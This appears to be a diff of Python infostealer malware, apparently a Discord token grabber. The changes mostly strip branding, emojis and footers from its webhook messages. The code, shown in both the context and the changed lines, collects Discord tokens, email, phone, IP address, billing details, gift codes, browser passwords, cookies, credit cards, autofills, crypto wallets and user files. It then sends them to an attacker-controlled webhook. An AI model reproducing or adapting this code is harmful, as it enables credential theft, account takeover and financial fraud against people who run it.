@@ -298,7 +298,7 @@ def G37C0D35(token):
         codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())
 
         for code in codess:
-            try:codes += f"<:black_gift:1184971095003107451> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
+            try:codes += f"**{str(code['promotion']['outbound_title'])}**\n`{str(code['code'])}`\n"
             except:pass
 
         nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
@@ -315,7 +315,7 @@ def G37C0D35(token):
 
             for el in nitrrrro:
                 cod = el['code']
-                try:codes += f"<:black_gift:1184971095003107451> **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
+                try:codes += f"**{name}**\n `https://discord.gift/{cod}`\n"
                 except:pass
         return codes
     except:return ""
@@ -420,7 +420,7 @@ def G37UHQ6U11D5(token):
                 inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                 try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                 except: cc = False
-                uhqguilds += f"<:blackarrow:1095740975197995041> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
+                uhqguilds += f" [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
         if uhqguilds == '': return '`No HQ Guilds Found`'
         return uhqguilds
     except:
@@ -499,7 +499,7 @@ def UP104D70K3N(token, path):
     }
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else " "
     billing = G3781111N6(token)
     badge = G3784D63(flags)
     friends = Tr1M(G37UHQFr13ND5(token))
@@ -521,46 +521,46 @@ def UP104D70K3N(token, path):
             "color": 2895667,
             "fields": [
                 {
-                    "name": "<:hackerblack:1095747410539593800> Token:",
-                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
+                    "name": "Token:",
+                    "value": f"`{token}`"
                 },
                 {
-                    "name": "<:mail:1095741024678191114> Email:",
+                    "name": "Email:",
                     "value": f"`{email}`",
                     "inline": True
                 },
                 {
-                    "name": "<:phone:1095741029832990720> Phone:",
+                    "name": "Phone:",
                     "value": f"{phone}",
                     "inline": True
                 },
                 {
-                    "name": "<a:blackworld:1095741984385290310> IP:",
+                    "name": "IP:",
                     "value": f"`{G371P()}`",
                     "inline": True
                 },
                 {
-                    "name": "<a:blackhypesquad:1095742323423453224> Badges:",
+                    "name": "Badges:",
                     "value": f"{nitro}{badge}",
                     "inline": True
                 },
                 {
-                    "name": "<a:blackmoneycard:1095741026850852965> Billing:",
+                    "name": "Billing:",
                     "value": f"{billing}",
                     "inline": True
                 },
                 {
-                    "name": "<:friends:1111401676511924448> HQ Friends:",
+                    "name": "HQ Friends:",
                     "value": f"{friends}",
                     "inline": False
                 },
                 {
-                    "name": "<:black_crown:1184938153291829288> HQ Guilds:",
+                    "name": "HQ Guilds:",
                     "value": f"{guilds}",
                     "inline": False
                 },
                 {
-                    "name": "<:black_gift:1184971095003107451> Gift Codes:",
+                    "name": "Gift Codes:",
                     "value": f"{codes}",
                     "inline": False
                 }
@@ -570,18 +570,14 @@ def UP104D70K3N(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": f"{footerc}",
-                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                "text": f"Well well well 👨🏿‍🌾👨🏿‍🌾👨🏿‍🌾",
+                "icon_url": ""
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
-        ],
-        "username": f"{cname} | t.me/{smallcname}r",
-        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
-        "attachments": []
-        }
+        ]
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
 
 def r3F0rM47(listt):
@@ -602,19 +598,15 @@ def UP104D(name, link):
             "content": GLINFO,
             "embeds": [
                 {
-               "title": f"{cname} | Data Extractor",
+               "title": f"{cname} | Data",
                 "color": 2895667,
                 "fields": link,
                 "footer": {
-                    "text": f"{footerc}",
-                    "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                    "text": f"Data Found",
+                    "icon_url": ""
                 },
                 }
-            ],
-            "username": f"{cname} | t.me/{smallcname}r",
-            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
-            "attachments": []
-            }
+            ]
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
     
@@ -636,17 +628,13 @@ def UP104D(name, link):
                 {
                 "color": 2895667,
                 "fields": endlist,
-                "title": f"{cname} | File {words}",
+                "title": f"KHGT",
                 "footer": {
-                    "text": f"{footerc}",
-                    "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                    "text": f"Yeah yeah!",
+                    "icon_url": ""
                 }
                 }
-            ],
-            "username": f"{cname} | t.me/{smallcname}r",
-            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
-            "attachments": []
-            }
+            ]
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
 
@@ -864,31 +852,27 @@ def G378r0W53r5(br0W53rP47H5):
         "content": GLINFO,
         "embeds": [
             {
-                "title": f"{cname} | Password {words}",
+                "title": f"{cname} | Password Lets goo",
                 "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n<:blackarrow:1095740975197995041> • [{cname}Passwords.txt]({filess[0]})",
                 "color": 2895667,
-                "footer": {"text": f"{footerc}",  
-                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
+                "footer": {"text": f"Dababy",  
+                "icon_url": " "}
             },
             {
-                "title": f"{cname} | Cookies {words}",
+                "title": f"{cname} | Cookies Lets goo",
                 "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found\n<:blackarrow:1095740975197995041> • [{cname}Cookies.txt]({filess[1]})",
                 "color": 2895667,
-                "footer": {"text": f"{footerc}",  
-                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
+                "footer": {"text": f"Dababy",  
+                "icon_url": " "}
             },
             {
                 "title": f"{cname} | Browser Data",
                 "description": f"<:srcr_newspaper:1187579795056373782> • **{H1570rYC0UNt}** Histories Found\n<:blackarrow:1095740975197995041> • [{cname}Histories.txt]({filess[4]})\n\n<:lol_role_fill:1187747599286018149> • **{AU70F111C0UNt}** Autofills Found\n<:blackarrow:1095740975197995041> • [{cname}Autofills.txt]({filess[3]})\n\n<:1SW_CreditCard:1187580159495245876> • **{CC5C0UNt}** Credit Cards Found\n<:blackarrow:1095740975197995041> • [{cname}CreditCards.txt]({filess[2]})\n\n<:black_book:1187577552739508286> • **{B00KM4rK5C0UNt}** Bookmarks Found\n<:blackarrow:1095740975197995041> • [{cname}Bookmarks.txt]({filess[5]})",
                 "color": 2895667,
-                "footer": {"text": f"{footerc}",  
-                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
+                "footer": {"text": f"Dababy",  
+                "icon_url": " "}
             }
-        ],
-        "username": f"{cname} | t.me/{smallcname}r",
-        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
-        "attachments": []
-    }
+        ]
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
     return
 
@@ -934,15 +918,15 @@ def G47H3rZ1P5(paths1, paths2, paths3):
     global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
     wal, ga, ot = "",'',''
     if not len(W411375Z1p) == 0:
-        wal = "<:ETH:975438262053257236>  •  Wallets\n"
+        wal = "Wallets\n"
         for i in W411375Z1p:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(G4M1N6Z1p) == 0:
-        ga = "<:blackgengar:1111366900690202624>  •  Gaming:\n"
+        ga = "Gaming:\n"
         for i in G4M1N6Z1p:
             ga += f"└─ [{i[0]}]({i[1]})\n"
     if not len(O7H3rZ1p) == 0:
-        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
+        ot = "Apps\n"
         for i in O7H3rZ1p:
             ot += f"└─ [{i[0]}]({i[1]})\n"
     headers = {
@@ -954,19 +938,15 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "content": GLINFO,
         "embeds": [
             {
-            "title": f"{cname} | App {words}",
+            "title": f"{cname} | App Lets goo",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": f"{footerc}",
-                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                "text": f"Dababy",
+                "icon_url": " "
             }
             }
-        ],
-        "username": f"{cname} | t.me/{smallcname}r",
-        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
-        "attachments": []
-    }
+        ]
     
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
 
@@ -1212,13 +1192,13 @@ def filestealr():
         if len(arg[2]) != 0:
             foldpath = arg[1].replace("\\", "/")
             foldlist = arg[2]
-            filetext += f"📁 {foldpath}\n"
+            filetext += f"{foldpath}\n"
 
             for ffil in foldlist:
                 a = ffil[0].split("/")
                 fileanme = a[len(a)-1]
                 b = ffil[1]
-                filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
+                filetext += f"└─ [{fileanme}]({b})\n"
             filetext += "\n"
     UP104D("kiwi", filetext)
 
@@ -1296,12 +1276,12 @@ for arg in K1W1F113s:
     if len(arg[2]) != 0:
         foldpath = arg[1]
         foldlist = arg[2]       
-        filetext += f"<:openfolder:1111408286332375040> {foldpath}\n"
+        filetext += f"{foldpath}\n"
 
         for ffil in foldlist:
             a = ffil[0].split("/")
             fileanme = a[len(a)-1]
             b = ffil[1]
-            filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
+            filetext += f"└─ [{fileanme}]({b})\n"
         filetext += "\n"
 UP104D("kiwi", filetext)
